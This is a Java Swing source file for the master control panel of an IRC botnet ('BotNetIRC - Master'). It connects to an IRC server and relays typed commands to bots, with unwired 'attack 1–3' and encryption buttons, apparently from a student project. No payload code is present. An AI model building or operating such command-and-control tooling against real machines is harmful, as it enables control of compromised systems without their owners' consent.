package mastergui;

import botlogic.Bot;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

/**
 * Created by zychp_w10 on 08.05.2017.
 */
public class Gui {
    private static String server = "irc.kubehe.me";
    private static String nick = "bot";
    private static String login = "bot";
    private static String channel = "#channel";
    private static String msg;


    private Bot masterbot;
    private JPanel mainpanel;
    private JTextField commandField1;
    private JButton sendbutton1;
    private JRadioButton testPołączeniaRadioButton;
    private JRadioButton atak1RadioButton;
    private JRadioButton atak2RadioButton;
    private JRadioButton atak3RadioButton;
    private JRadioButton szyfrowanieRadioButton;
    private JTextArea logtextArea1;
    private JScrollBar logscrollBar1;
    private JPanel logpanel;
    private JPanel buttonpanel;
    private JPanel encryption;
    private JPanel graphpanel;

    public Gui() throws Exception {
        logtextArea1.setText("TEST");
        masterbot = new Bot(server, "masterGui", "masterGui", channel);
        masterbot.connectToIRC();
        sendbutton1.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e)  {
                String command;
                command = commandField1.getText();
                commandField1.setText(command);
                try {
                    masterbot.sendMessage(command);
                }
                catch (java.lang.Exception exc) {
                }
            }
        });
    }

    public static void main(String[] args) throws Exception {
        JFrame frame = new JFrame("Gui");
        frame.setSize(600, 400);
        frame.setLocationByPlatform(true);
        frame.setTitle("BotNetIRC - Master");
        frame.setContentPane(new Gui().mainpanel);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setVisible(true);
    }
}
